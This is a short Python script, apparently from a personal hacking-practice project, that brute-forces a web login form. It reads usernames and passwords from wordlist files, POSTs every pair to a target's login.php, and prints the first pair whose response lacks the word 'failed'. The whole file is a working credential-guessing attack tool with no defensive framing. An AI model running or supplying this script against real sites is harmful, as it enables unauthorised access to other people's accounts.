#!/usr/bin/env python

import requests

def guess_cred(data_dict, target_url):
    with open("C:/Users/liboep/Desktop/Malware/vulnerability_scanner/username.txt", "r") as username_wordlist:
        for usr_line in username_wordlist:
            usr_word = usr_line.strip()
            data_dict["username"] = usr_word
            with open("C:/Users/liboep/Desktop/Malware/vulnerability_scanner/passwords.txt", "r") as password_wordlist:
                for pwd_line in password_wordlist:
                    pwd_word = pwd_line.strip()
                    data_dict["password"] = pwd_word
                    response = requests.post(target_url + "login.php", data=data_dict)
                    #print(response.content.decode())
                    if "failed".encode() not in response.content:
                        print("[+] Got log in info -->")
                        print("username = " + usr_word)
                        print("password = " + pwd_word)
                        return data_dict
                        

    print("[+] End of line.")
    return